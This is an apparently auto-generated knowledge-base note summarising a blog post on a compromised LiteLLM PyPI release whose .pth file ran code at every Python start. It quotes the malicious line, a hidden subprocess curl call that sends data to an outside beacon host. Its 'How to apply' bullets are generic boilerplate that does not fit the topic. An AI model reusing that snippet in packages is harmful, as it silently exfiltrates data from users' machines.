---
title: How .pth Files Became a Supply Chain Weapon (and How to Detect Them)
date: '2026-03-26'
source: https://dev.to/0xallendev/how-pth-files-became-a-supply-chain-weapon-and-how-to-detect-them-1l2o
domain: AI-Tools
relevance: 🟡
tags:
- '#ai'
- '#library'
- '#python'
- '#sql'
- '#tool'
- '#tutorial'
related:
- '[[2026-03-25-the-litellm-supply-chain-attack-how-mcp-servers-got-compromised-and-how-to-check-if-youre-affected]]'
- '[[2026-03-25-litellm-pypi-compromise-is-just-the-beginning-how-to-audit-your-python-dependencies-right-now]]'
- '[[2026-03-09-how-to-build-and-publish-a-python-package-to-pypi-with-a-real-project]]'
- '[[2026-03-02-python-automation-12-scripts-that-save-hours-every-week]]'
- '[[2026-03-16-stop-sending-your-code-to-the-cloud-to-find-bugs]]'
- '[[2026-03-08-building-autonomous-ai-agents-that-actually-do-work]]'
status: unread
---

> **TL;DR:** The Attack That Started It On March 24, 2026, LiteLLM 1.82.7 was published to PyPI. It contained a file called litellm_init.pth : import subprocess , sys subprocess . Popen ( [ ' curl ' , ' -s ' , ' https://models.litell…

## What’s new and why it matters
The Attack That Started It On March 24, 2026, LiteLLM 1.82.7 was published to PyPI. It contained a file called litellm_init.pth : import subprocess , sys subprocess . Popen ( [ ' curl ' , ' -s ' , ' https://models.litellm.cloud/beacon ' , ' -d ' , sys . version ], stdout = subprocess . DEVNULL , stderr = subprocess . DEVNULL ) This wasn't in the main code. It was in a .pth file. What Are .pth Files? Python's .pth (path) files live in site-packages/ and execute every time you start Python — not just during pip install . Most developers don't know this. Attackers do. Why Other Scanners Missed It…

## How to apply
- Extract 1 actionable tactic from this post and try it on a real dataset this week.
- Reproduce the example in a notebook; then refactor into a reusable function.
- Add a short note: what changed in your workflow?

## Relevance
🟡

## Source
https://dev.to/0xallendev/how-pth-files-became-a-supply-chain-weapon-and-how-to-detect-them-1l2o

## Related notes
- [[2026-03-25-the-litellm-supply-chain-attack-how-mcp-servers-got-compromised-and-how-to-check-if-youre-affected]]
- [[2026-03-25-litellm-pypi-compromise-is-just-the-beginning-how-to-audit-your-python-dependencies-right-now]]
- [[2026-03-09-how-to-build-and-publish-a-python-package-to-pypi-with-a-real-project]]
- [[2026-03-02-python-automation-12-scripts-that-save-hours-every-week]]
- [[2026-03-16-stop-sending-your-code-to-the-cloud-to-find-bugs]]
- [[2026-03-08-building-autonomous-ai-agents-that-actually-do-work]]
